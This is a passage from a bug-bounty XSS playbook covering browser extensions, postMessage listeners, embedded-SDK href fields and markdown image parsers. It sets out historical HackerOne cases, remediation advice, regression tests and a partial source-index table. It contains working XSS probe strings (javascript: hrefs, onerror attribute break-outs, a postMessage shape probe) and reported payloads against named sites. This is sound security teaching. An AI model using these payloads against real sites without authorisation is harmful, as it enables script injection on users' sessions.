| DOM-018 | `231053` | clone-able object bypassing the postMessage escaping |
| BROW-008 | `217745` | unsanitised button `href` in the Embedded App SDK |
| BROW-006 | `191380` | remove `:large` from the image URL, append `%23.html` |

#### 6.2 Newly authored illustrations (not from the archive)

**Extension DOM-write audit** (newly authored; run on your own extension):

````bash
# newly authored
grep -rnoE "(innerHTML|outerHTML|insertAdjacentHTML|document\.write|\.html\()" src/
````

**`postMessage` origin/shape probe.** Newly authored. Serve from a page you control:

````js
// newly authored — send to a target window
const w = window.open('https://TARGET/');
const probes = [
  'H1XSSMARKER9',                                  // plain string
  ['H1XSSMARKER9'],                                // array
  { toString: () => 'H1XSSMARKER9' },              // object with toString
  { a: { b: 'H1XSSMARKER9' } },                    // nested object
];
for (const p of probes) w.postMessage(p, 'https://TARGET');
````

If the target renders the marker as an **element** rather than as text, the escaping is
shape-dependent.

**SDK `href` scheme probe.** Newly authored:

````
javascript:alert(1)
javascript://alert(1);%2f%2f@
data:text/html,<h1>xss-marker
vbscript:msgbox(1)
````

**Markdown image parser probe.** Newly authored:

````
![x](http://h/i'onerror=alert(1)//.png)
![x](http://h/i"onerror=alert(1)//.svg)
![x](javascript:alert(1))
![x](<http://h/i onerror=alert(1)>)
````

**Safe proof.** Prefer `document.title='marker'` or a collaborator callback over
`alert(1)`. For `DOM-016` the researcher deliberately used inert search terms for the
HTML-injection stage before demonstrating execution.

### 7. Encoding, Filtering, and Parsing Behavior

| Behaviour | Case | Consequence |
| --- | --- | --- |
| Extension writes remote data with no encoding | `DOM-016` | XSS on a third-party origin |
| `postMessage` with no origin validation | `DOM-018` | any origin can reach the sink |
| `postMessage` escaping that is **shape-dependent** | `DOM-018` | escaping bypassable |
| `href` field with no scheme validation | `BROW-008` | `javascript:` URL executes |
| Parser validates extension, not quoting | `BROW-007` | attribute break-out before `.png` |
| Template escaping not context-aware, re-parsed downstream | `FRAM-004` | second injection point |

The shared theme: **the code was in the right neighbourhood and validated the wrong
property.** Origin not checked; type not coerced; scheme not validated; extension
checked instead of quotes.

### 8. Impact and Severity Considerations

| Report | Program | Severity | Bounty | Viewer |
| --- | --- | --- | --- | --- |
| `231053` DOM-018 | Shopify | not disclosed | $3,000 | any visitor, any shop |
| `217790` FRAM-004 | Shopify | high | $1,000 | store administrator |
| `217745` BROW-008 | Shopify | high | $800 | store administrator |
| `220494` DOM-016 | Algolia | high | not disclosed | GitHub users with the extension |
| `191909` BROW-007 | Discourse | high | $256 | any reader of the post |
| `191380` BROW-006 | Twitter | not disclosed | $1,680 | recipients of a DM |

**Two drivers, as always: the victim, and how far the attacker reached.**

- **Admin-session execution** (`FRAM-004`, `BROW-008`) is why both Shopify reports are
  `high` despite modest bounties. A malicious app executing in a store admin's session
  is account compromise by another name.
- **Breadth** is why `DOM-018` is `$3,000`: the team stated it affected *"all Shopify
  stores"* and could be triggered *"from any remote origin"*.
- **The extension case has a real constraint.** `DOM-016`'s impact depends on the
  extension's install base. State it if you know it; do not assume reach.
- **Ownership affects severity perception, not validity.** A report against someone
  else's extension is a valid report — against *them*.

### 9. False Positives and Limitations

- **Not your code, not your report.** An XSS in a third-party extension is that
  vendor's bug. Check program scope before filing.
- **A DOM mutation is not necessarily execution.** `DOM-016`'s first step showed a
  *broken `<img>` element*, which is markup injection; the alert in the second step is
  what established XSS. Report both stages and label them.
- **CSP may or may not apply to extension-injected script.** Extension content scripts
  share the page's CSP in most configurations, but `DOM-016` demonstrated execution,
  so verify rather than assume either way.
- **`postMessage`: prove the listener responded** from your origin before reporting.
  A listener that ignores the message is not a vulnerability.
- **The SDK boundary requires in-scope installation.** If the program does not allow
  third-party apps, `FRAM-004`/`BROW-008`-shaped findings are out of scope.
- **Cross-reference prior art.** `BROW-008` did this in its first line; it shortens
  triage and prevents a duplicate.

### 10. Remediation and Regression Testing

#### 10.1 Remediation

**Extensions:**
- Never write remote data with `innerHTML`/`outerHTML`/`insertAdjacentHTML`. Use
  `textContent`.
- Where markup is genuinely required, sanitise with an allow-list library.
- Treat *all* data originating outside the extension as untrusted, including values
  your own users create on other platforms.
- Request the minimum host permissions; do not run on sites you do not need.

**`postMessage`:**
1. **Validate `event.origin` against an exact allow-list**, before anything else.
2. **Coerce `event.data` to the expected type first** — `String()`, `Number()`, or
   pick a typed field. Never sanitise a raw object (`DOM-018`).
3. Validate `event.source` where relevant.
4. Use `targetOrigin` explicitly in `postMessage` calls rather than `'*'`.
5. Encode on output regardless of input checks.

**Embedded SDKs:**
- Scheme allow-list on every `href`/`url` parameter (`BROW-008`).
- Treat app-supplied values as untrusted at the parent-frame boundary.
- Context-aware escaping that accounts for any downstream re-parse (`FRAM-004`).

**Parsers:**
- Validate the entire construct, not just the file extension (`BROW-007`).
- Build `<img>` via the DOM rather than string assembly.

**General:** CSP without `unsafe-inline` as defence in depth.

#### 10.2 Regression tests

| Test | Asserts |
| --- | --- |
| Extension: remote values assigned via `textContent` only | no HTML sink |
| Extension: allow-list sanitiser test corpus | sanitiser holds |
| `postMessage` from an unlisted origin | ignored before any processing |
| `postMessage` with array / nested object / `toString` object | coerced to primitive first |
| `postMessage` outgoing calls use an explicit `targetOrigin` | no `'*'` |
| SDK `href` = `javascript:` / `data:` / `vbscript:` | rejected |
| Markdown image with `'` and `"` in the URL part | no attribute break-out |
| Cross-reference test: install a benign test app and confirm values are escaped | boundary holds |

### 11. Historical Bug Bounty Case Studies

Sourced facts only. All 8 sources retrieved with full bodies. Inventory:
[`references/source-index.md`](../../references/source-index.md).

---

#### DOM-018 — XSS on any Shopify shop via structured clone abuse in a postMessage listener

- **Program:** Shopify · **Report:** <https://hackerone.com/reports/231053>
- **Weakness:** `Cross-site Scripting (XSS) - DOM` · **Bounty:** $3,000
- **Severity / date:** not disclosed in the accessible source
- **Body inspected:** Yes — **full report**.
- Full case study also in [`DOM-Based-XSS.md`](../../DOM-Based-XSS.md) §11.

Root cause and team summary quoted verbatim in §2.2 above. The single most valuable
`postMessage` case in the archive: origin validation absent **and** escaping defeated by
object shape.

---

#### DOM-016 — Unsanitised HTML from a browser extension leading to XSS on GitHub.com

- **Program:** Algolia · **Report:** <https://hackerone.com/reports/220494>
- **Weakness:** `Cross-site Scripting (XSS) - DOM` · **Severity:** high
- **Bounty:** not disclosed in the source
- **Body inspected:** Yes — **full report**.

**Affected feature:** the *Awesome Autocomplete for GitHub* extension, owned by
Algolia, rendering into `github.com`'s DOM.

**Reproduction (as submitted):**
1. Search for `'"><img src=x onerror=` on GitHub.com → a broken `<img>` element and
   requests to `x` appear.
2. Search for `a'"><h1` → *"Because of a specific repository name being loaded, a
   JavaScript alert dialog will appear."*

**Test environment (stated):** Chrome 57.0.2987.133, Safari 10.1, macOS Sierra 10.12.4,
Windows 7 x64.

**Researcher's disclaimer, verbatim:** *"Please note that I do not have ownership nor
affiliation with the repository and user names in this report, nor the final JavaScript
alert dialog."*

---

#### BROW-008 — XSS in the Shopify admin via "Button Objects" in a malicious app

- **Program:** Shopify · **Report:** <https://hackerone.com/reports/217745>
- **Weakness:** `XSS - Generic` · **Severity:** high · **Bounty:** $800
- **Body inspected:** Yes — **full report**.

**Prior-art cross-reference (researcher's opening line, verbatim):** *"This report is
similar in impact, exploitability and root-cause as report #205701 requiring an
additional step of user-interaction."*

**Root cause (researcher):** *"Buttons can define an `href` parameter which will open
when the button is clicked. The `href` parameter is not properly sanitized allowing a
malicious app to execute JavaScript in the context of the admin interface."*

**Vulnerable code (quoted in the report):** `clickButton` reads `href = data.href` and
for `target: "parent" | "shopify"` calls `Page.visit(href, { reload: true })` with no
scheme validation.

**Impact:** execution in the **store administrator's** session on
`$shop$.myshopify.com/admin/`.

---

#### BROW-007 — XSS Vulnerability on Image link parser (Discourse)

- **Program:** Discourse · **Report:** <https://hackerone.com/reports/191909>
- **Weakness:** `XSS - Generic` · **Severity:** high · **Bounty:** $256
- **Body inspected:** Yes — **full report**.

**Affected feature:** the markdown parser's image-URL handling.

**Payload (as submitted):**
````
http://host/path/to/image'onerror=alert(1);//.png
````

**Root cause (researcher, verbatim):** *"We have an invalid image URL which finish with
an image extension (PNG). By putting the `'` we are able to break the `img` tag in
which the image url is included by the parser and add custom code, allowing us to run
Javascript code."*

**Impact as claimed:** *"A malicious user could use the `$.getScript` function to load a
malicious script."*

---

#### BROW-006 — CRLF and XSS stored on ton.twitter.com

- **Program:** Twitter · **Report:** <https://hackerone.com/reports/191380>
- **Weakness:** `XSS - Generic` · **Bounty:** $1,680
- **Body inspected:** Yes — **full report**.

**Mechanism (researcher):** upload a `.jpg` to Twitter, then *"changing the extension
from `.jpg` to `.html`"* on the served path. The reproduction removes the `:large`
suffix from the image URL and appends `%23.html`.

**Honest ceiling (researcher, verbatim):**

> "however this image can only appear to you and to the one who you send it to because
> it is a private message and to send the message you have to follow the victim and the
> victim has to follow you in most cases and **ton.twitter.com has no valuable cookies
> at all** so the impact will be a phishing page…"

This self-limiting statement is a model for impact sections — see §9 of
[`Reflected-XSS.md`](../../Reflected-XSS.md).

---

#### BROW-004 — www.veris.in DOM based XSS

- **Program:** Veris · **Report:** <https://hackerone.com/reports/119453>
- **Weakness:** `XSS - Generic` · **Severity / Bounty:** not disclosed in the source
- **Body inspected:** Yes — **full report**.

**Payload (as submitted):** `https://www.veris.in/?#<img src=x onerror=alert(1)>`

**Researcher's statement, verbatim:** *"An attacked can execute arbitrary js at your
main page"* (sic).

**Supporting evidence supplied:** the vulnerable bundled source URL —
`https://www.veris.in/wp-content/plugins/Ultimate_VC_Addons/assets/min-js/ultimate.min.js?ver=7e111f63322706ef9e00ec1e58f2edf4`

---

#### FRAM-004 (cross-reference) — twine template injection in the Embedded App SDK

- **Program:** Shopify · **Report:** <https://hackerone.com/reports/217790>
- Full case study in [`Framework-and-Template-XSS.md`](../../Framework-and-Template-XSS.md) §11.

Listed here because it shares this playbook's trust boundary — a malicious installed
app reaching the admin session — while its root cause is template injection.

### 12. Professional Vulnerability Report Template

`````markdown
# <Extension | postMessage | SDK | parser> XSS in <component> — <mechanism>

## Summary
<Component> writes <source> into <sink> without <missing control>, executing in
<origin>. State clearly which code you own.

## Ownership
- Vulnerable code: <extension / endpoint / SDK> — owned by <program>: <yes/no>
- Attacker-controlled data: <what is not yours>
- I do not have ownership or affiliation with: <list>

## Severity
<rating> — <viewer; install base / reach; CSP>

## Affected endpoint / component
`https://<host>/<path>` · Sink: `<innerHTML | postMessage | href | parser>` · Program: <name>

## Vulnerability details
### Flow
````
<source>  →  <code path>  →  <sink>  →  execution in <origin>
````

### Missing control
<origin validation / type coercion / scheme allow-list / output encoding>

## Proof of concept
1. <Setup>
2. <Trigger>
3. `document.domain` = `<origin>`.
4. Paste the DOM or network evidence.

## Remediation
<See §10.1.>

## Prior art
<Cross-reference similar reports.>
`````

**Reporting discipline.** Include the ownership disclaimer. Prove the `postMessage`
listener actually responded. For extensions, state the install base if known. For SDK
findings, establish that malicious app installation is in scope. Cross-reference prior
art in your opening line.

### 13. References

- MDN — `Window.postMessage()` (security considerations): <https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage>
- MDN — Same-origin policy: <https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy>
- Chrome — Content scripts and isolated worlds: <https://developer.chrome.com/docs/extensions/develop/concepts/content-scripts>
- OWASP — DOM based XSS: <https://cheatsheetseries.owasp.org/cheatsheets/DOM_Based_XSS_Cheat_Sheet.html>
- PortSwigger — DOM-based XSS: <https://portswigger.net/web-security/dom-based>
- Shopify Embedded App SDK — Button Objects: <https://shopify.dev/docs/apps/build/embedded-app-sdk/methods>
- Reports cited: <https://hackerone.com/reports/231053>, <https://hackerone.com/reports/220494>,
  <https://hackerone.com/reports/217745>, <https://hackerone.com/reports/191909>,
  <https://hackerone.com/reports/191380>, <https://hackerone.com/reports/119453>,
  <https://hackerone.com/reports/217790>

### 14. Research Gaps and Further Investigation

- **Smallest playbook here at 8 sources**, all pre-2017. Extension and messaging XSS
  has grown a great deal since — Manifest V3, service workers, and the `window.postMessage`
  patterns in embedded flows are all absent.
- **`DOM-018`'s exact clone-able object shape is not documented** in the accessible
  source. Reconstructing it would make the §6.2 shape probe concrete rather than
  conceptual.
- **No service-worker or MV3 sources.** Modern extensions inject via
  `chrome.scripting`/`declarativeNetRequest`, a different surface entirely.
- **Untested:** cross-origin `iframe` message handling; `MessageChannel`/`MessagePort`
  transfers; extension content-script CSP interaction; `sandbox` attribute behaviour
  with `postMessage`.
- **Ownership boundary untested.** No source here establishes what happens when the
  vulnerable third-party code is neither the target's nor the reporter's. That scoping
  question is likely a common triage failure and would benefit from documented examples.



---

<!-- PART 12 of 12 :: references/source-index.md -->

## XSS Source Index

Complete inventory of every public HackerOne XSS report discovered in the
[Nathan's HackerOne archive](https://h1.security.nathan.sx/) and mapped to its
destination playbook in this knowledge base.

- **Archive accessed:** 2026-10-12
- **Archive last updated (per site):** 12th September 2017
- **Total report entries in archive:** 4,419
- **Entries matching an XSS search term:** 910
- **Curated as genuine XSS sources:** 562

### Method and evidence levels

The archive itself carries only `Team | Bounty | Title` plus a link to the original
report. It contains no report bodies. For each candidate, the public,
unauthenticated HackerOne report endpoint was read to obtain the authoritative
program, weakness classification, severity, bounty, dates, affected asset and —
where HackerOne published it — the full researcher report body.

| Evidence quality | Meaning | Count |
| --- | --- | --- |
| Full report | Researcher-written report body retrieved | 459 |
| Partial report | Original body withheld; HackerOne's official team disclosure summary available | 103 |
| Title-only | Original report no longer publicly retrievable (HTTP 404) | 0 |

### How to read a row

- **Case ID** — stable identifier used by the playbooks to cite the source.
- **Original report URL** — canonical `hackerone.com/reports/<id>` link.
- **Archive team page** — the per-program page in the archive that listed it.
- **Playbook** — the consolidated playbook that contains its case-study section.
- **Limitations** — what could not be established from the retrievable evidence.

### Deduplication rules applied

- Exact duplicate report IDs appearing more than once in the archive were merged
  into a single row.
- Mirrored entries were merged when they carried the same HackerOne report ID.
- Reports that share a root cause were consolidated into one playbook but
  retained as separate rows and separate case-study subsections.
- Reports with distinct root causes, contexts or trust boundaries were kept separate
  even when the title wording was identical.

---

### Playbook distribution

| Playbook | Sources | Full | Partial | Title-only |
| --- | ---: | ---: | ---: | ---: |
| [`Context-Based-XSS.md`](../../Context-Based-XSS.md) | 196 | 168 | 28 | 0 |
| [`Stored-XSS.md`](../../Stored-XSS.md) | 154 | 127 | 27 | 0 |
| [`Reflected-XSS.md`](../../Reflected-XSS.md) | 85 | 48 | 37 | 0 |
| [`Filter-Bypass-and-Encoding.md`](../../Filter-Bypass-and-Encoding.md) | 38 | 38 | 0 | 0 |
| [`Self-XSS.md`](../../Self-XSS.md) | 24 | 24 | 0 | 0 |
| [`DOM-Based-XSS.md`](../../DOM-Based-XSS.md) | 22 | 18 | 4 | 0 |
| [`File-Upload-and-SVG-XSS.md`](../../File-Upload-and-SVG-XSS.md) | 18 | 13 | 5 | 0 |
| [`HTML-Injection.md`](../../HTML-Injection.md) | 13 | 11 | 2 | 0 |
| [`Browser-Extension-and-Messaging-XSS.md`](../../Browser-Extension-and-Messaging-XSS.md) | 8 | 8 | 0 | 0 |
| [`Framework-and-Template-XSS.md`](../../Framework-and-Template-XSS.md) | 4 | 4 | 0 | 0 |

---

### Full inventory

#### Context-Based-XSS → [`Context-Based-XSS.md`](../../Context-Based-XSS.md)

196 sources. Weakness field as published by HackerOne:

- Cross-site Scripting (XSS) - Generic: 196

| Case ID | Original report title | Program | Published | Severity | Bounty | Weakness (H1) | Affected asset | Evidence | Playbook |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| CONT-001 | [Cross Site Scripting (XSS) - app.relateiq.com](https://hackerone.com/reports/2439) | RelateIQ | 2014-02-28T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-002 | [XSS in Theme Preview Tools File](https://hackerone.com/reports/4777) | concrete5 | 2014-03-25T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-003 | [/index.php/dashboard/sitemap/explore/ Cross-site scripting](https://hackerone.com/reports/4808) | concrete5 | 2014-03-26T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-004 | [XSS in private message](https://hackerone.com/reports/4826) | concrete5 | 2014-03-26T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-005 | [XSS IN member List (Because of City Textbox)](https://hackerone.com/reports/4839) | concrete5 | 2014-03-26T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-006 | [http://smarthistory.khanacademy.org/search-results.html XSS](https://hackerone.com/reports/6344) | Khan Academy | 2014-04-07T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-007 | [https://www.khanacademy.org/coach/reports/activity XSS](https://hackerone.com/reports/6409) | Khan Academy | 2014-04-08T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-008 | [XSS at http://smarthistory.khanacademy.org](https://hackerone.com/reports/6575) | Khan Academy | 2014-04-08T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-009 | [XSS on [/concrete/concrete/elements/dashboard/sitemap.php]](https://hackerone.com/reports/6853) | concrete5 | 2014-04-10T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-010 | [XSS in Groups](https://hackerone.com/reports/7868) | Localize | 2014-04-17T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-011 | [XSS in main page](https://hackerone.com/reports/7882) | Localize | 2014-04-17T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-012 | [XSS in main page (invitation)](https://hackerone.com/reports/7886) | Localize | 2014-04-17T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-013 | [XSS in invite approval](https://hackerone.com/reports/7887) | Localize | 2014-04-17T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-014 | [XSS in Localize.io](https://hackerone.com/reports/7890) | Localize | 2014-04-17T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-015 | [Import emails from Gmail are activate XSS](https://hackerone.com/reports/7913) | Respondly | 2014-04-17T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-016 | [Find, private notes Cross-site scripting.](https://hackerone.com/reports/7917) | Respondly | 2014-04-17T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-017 | [XSS via Email](https://hackerone.com/reports/7919) | Respondly | 2014-04-17T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-018 | [XSS in password](https://hackerone.com/reports/7995) | Localize | 2014-04-18T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-019 | [XSS via Email Link](https://hackerone.com/reports/8010) | Respondly | 2014-04-18T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-020 | [XSS in Stopthehacker support](https://hackerone.com/reports/8862) | StopTheHacker | 2014-04-21T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-021 | [Xss in CampTix Event Ticketing](https://hackerone.com/reports/9391) | Ian Dunn | 2014-04-23T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-022 | [XSS in Team Only Area](https://hackerone.com/reports/10577) | Localize | 2014-05-02T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-023 | [XSS in the input](https://hackerone.com/reports/12389) | Respondly | 2014-05-17T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-024 | [Suffix of url-path is vulnerable to XSS-attack](https://hackerone.com/reports/13285) | Khan Academy | 2014-05-25T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-025 | [Unchecking hidden parameter is vulnerable to XSS-attack](https://hackerone.com/reports/13506) | Khan Academy | 2014-05-26T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-026 | [xss in app.simplenote.com](https://hackerone.com/reports/13703) | Automattic | 2014-05-27T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-027 | [xss in simperium.com](https://hackerone.com/reports/13746) | Automattic | 2014-05-28T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-028 | [XSS on gravatar](https://hackerone.com/reports/13794) | Automattic | 2014-05-28T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-029 | [XSS vulnerability in video player page](https://hackerone.com/reports/15125) | Twitter | 2014-06-04T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-030 | [XSS ON MOPUB.COM](https://hackerone.com/reports/15356) | Twitter | 2014-06-06T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-031 | [Album image XSS](https://hackerone.com/reports/17235) | Uzbey | 2014-06-22T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-032 | [email field doesn't filtered against XSS](https://hackerone.com/reports/17287) | Uzbey | 2014-06-23T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-033 | [Cross site scripting in type parameter](https://hackerone.com/reports/17299) | Uzbey | 2014-06-23T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-034 | [XSS](https://hackerone.com/reports/18372) | jsDelivr | 2014-06-29T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-035 | [XSS in editor by any user](https://hackerone.com/reports/18691) | Phabricator | 2014-07-01T00:00:00 | Not disclosed in the source | $1,000 | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-036 | [XSS 01 on staging.fct.li](https://hackerone.com/reports/18805) | Factlink | 2014-07-02T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-037 | [IFXSS (image filename XSS) by creating a new Photo Gallery](https://hackerone.com/reports/19451) | Uzbey | 2014-07-08T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-038 | [Cross-site Scripting in mailing (username)](https://hackerone.com/reports/20049) | RelateIQ | 2014-07-14T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-039 | [XSS in 3rd party plugin (not affecting Uzbey's users)](https://hackerone.com/reports/23010) | Uzbey | 2014-08-08T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-040 | [ads.twitter.com xss](https://hackerone.com/reports/27511) | Twitter | 2014-09-09T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-041 | [Cross site scripting on ads.twitter.com](https://hackerone.com/reports/28150) | Twitter | 2014-09-15T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-042 | [XSS platform.twitter.com | video-js metadata](https://hackerone.com/reports/29360) | Twitter | 2014-09-29T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-043 | [Sql injection And XSS](https://hackerone.com/reports/31023) | Khan Academy | 2014-10-11T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-044 | [XSS in fabric.io](https://hackerone.com/reports/32519) | Twitter | 2014-10-22T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-045 | [DOM Cross-Site Scripting ( XSS )](https://hackerone.com/reports/33091) | Twitter | 2014-10-28T00:00:00 | Not disclosed in the source | $1,400 | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-046 | [XSS via Fabrico Account Name](https://hackerone.com/reports/34725) | Twitter | 2014-11-06T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-047 | [XSS in Tagregator plugin](https://hackerone.com/reports/35036) | Ian Dunn | 2014-11-09T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-048 | [xss in /browse/contacts/](https://hackerone.com/reports/38189) | Openfolio | 2014-12-04T00:00:00 | Not disclosed in the source | $100 | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-049 | [HTML/XSS rendered in Android App of Crashlytics through fabric.io](https://hackerone.com/reports/41856) | Twitter | 2014-12-25T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-050 | [XSS on partners.uber.com](https://hackerone.com/reports/42393) | Uber | 2015-01-03T00:00:00 | Not disclosed in the source | $500 | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
